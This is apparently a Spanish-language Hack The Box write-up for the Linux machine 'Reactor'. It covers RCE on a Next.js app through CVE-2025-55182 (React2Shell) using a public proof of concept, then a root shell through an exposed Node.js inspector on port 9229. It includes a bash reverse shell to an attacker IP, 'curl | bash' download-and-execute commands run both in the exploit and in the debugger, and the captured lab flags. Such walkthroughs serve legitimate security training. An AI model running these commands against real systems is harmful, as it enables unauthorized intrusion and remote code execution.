---
title: Reactor
description: Reactor es una máquina Linux fácil basada en el panel de control de supervisión nuclear ReactorWatch, una aplicación Next.js 15.0.3 / React 19.0.0 accesible en el puerto 3000. La pila es vulnerable a CVE-2025-55182, más conocida como React2Shell, un fallo de deserialización insegura en React Server Components que permite la ejecución remota de código sin autenticación. Utilizando una prueba de concepto pública, conseguimos un punto de acceso como la cuenta de servicio «node» con privilegios reducidos. A partir de ahí, enumeramos el directorio de la aplicación, recuperamos una base de datos SQLite que contiene registros de usuarios y desciframos un hash de contraseña MD5 para obtener credenciales SSH válidas para el usuario «engineer». La escalada de privilegios aprovecha un servicio de monitorización propiedad de root que se inició con el indicador de depuración «--inspect» de Node.js vinculado a un puerto local. Al establecer un túnel hacia ese puerto de depuración y canalizarlo a través del protocolo del inspector V8, ejecutamos código como root y escalamos a un shell root completo.
date: 2026-10-16
toc: true
pin: false
image: assets/img/htb-writeup-reactor/reactor.png
categories:
  - Hack The Box
  - Machines
  - Linux
tags:
  - Linux-Fundamentals
  - Web-Application-Security
  - Exploiting_CVE-2025-55182
  - SQLite-Enumeration
  - Abusing-Node_js-Inspector
  - node-inspector
  - React2Shell
---

## 1. Enumeración


### Escaneo de Puertos (Nmap)

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.135.153 -oG allports
```


**Resultado:**
```text
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
```


Escaneo detallado:
```bash
nmap -p22,3000 -sCV -Pn 10.129.135.153 -oN targeted
```


**Relevante:**
```text
3000/tcp open  ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: Next.js
|     Content-Type: text/html; charset=utf-8
```


### Enumeración Web


Agregamos el dominio a `/etc/hosts`:
```bash
echo "10.129.135.153 reactor.htb" | sudo tee -a /etc/hosts
```

Visitamos `http://reactor.htb:3000` y vemos el panel **ReactorWatch**. Con Wappalyzer o las cabeceras confirmamos Next.js + React.


### Detección de Vulnerabilidad
Escaneamos con Nuclei:
```bash
nuclei -target http://10.129.135.153:3000
```


**Resultado:**
```text
[CVE-2025-55182] [http] [critical] http://10.129.135.153:3000
```

Confirmado: **CVE-2025-55182 (React2Shell)**.

---


## 2. Foothold (Acceso como `node`)

Clonamos el PoC:
```bash
git clone https://github.com/jensnesten/React2Shell-PoC
cd React2Shell-PoC
```


Verificamos RCE:
```bash
python3 main.py http://10.129.135.153:3000 'whoami'
```

**Salida:**
```text
node
```



### Reverse Shell

Preparamos un servidor HTTP con la reverse shell:
```bash
mkdir www && cd www
echo "/bin/bash -i >& /dev/tcp/10.10.15.202/9001 0>&1" > index.html
python3 -m http.server 8000
```


Ejecutamos el exploit apuntando a nuestro servidor:
```bash

python3 main.py http://10.129.135.153:3000 '/usr/bin/curl http://10.10.15.202:8000 | /bin/bash'
```


Recibimos la shell en el listener:
```bash
nc -lvnp 9001
```
Obtenemos acceso como `node`.

---



## 3. Privilege Escalation (Root)


### Enumeración de Puertos Locales
Listamos los puertos en escucha:
```bash
ss -lntp
```


**Resultado relevante:**
```text
LISTEN 0 511 127.0.0.1:9229 0.0.0.0:*
```

El puerto 9229 corresponde al **Node.js Inspector**. Consultamos la guía de [HackTricks](https://hacktricks.wiki/en/linux-hardening/software-information/electron-cef-chromium-debugger-abuse.html#connect-to-inspectordebugger) sobre *Node inspector/CEF debug abuse*.



### Conexión al Inspector
Nos conectamos al depurador:
```bash
node inspect 127.0.0.1:9229
```


Una vez dentro del modo debug, ejecutamos código arbitrario como root. Reutilizamos el método de `curl | bash`:


1. En nuestra máquina atacante, mantenemos el servidor HTTP con la reverse shell en el puerto 9001 (o reutilizamos el mismo `index.html` apuntando a otro puerto, por ejemplo 9002).

2. En el debugger, ejecutamos:

```javascript

exec("process.mainModule.require('child_process').exec('/usr/bin/curl http://10.10.15.202:8000 | bash')")
```

Recibimos la conexión en nuestro listener (`nc -lvnp 9002`) y obtenemos una shell como **root**.



### Flags
Leemos ambas flags:
```bash
root@reactor:~# cat /root/root.txt
1ac170a9c6afc63b80a65d133fa02d4e

root@reactor:~# cat /home/engineer/user.txt
d225e688ef345641bbd8be45a5bf0880
```

---

## end

reactor demuestra el impacto de una vulnerabilidad crítica en Next.js/React (CVE-2025-55182) para obtener acceso inicial como `node`. La escalada de privilegios fue posible gracias a un servicio systemd mal configurado que exponía el Node.js Inspector en `127.0.0.1:9229` ejecutándose como root. El abuso del protocolo V8 Inspector permitió ejecutar código arbitrario como root sin necesidad de credenciales adicionales.

**Nota:** la ruta original es con SQLite y SSH como `engineer`, pero en esta ejecución se optamos por el camino directo a través del Inspector, que resultó más eficiente.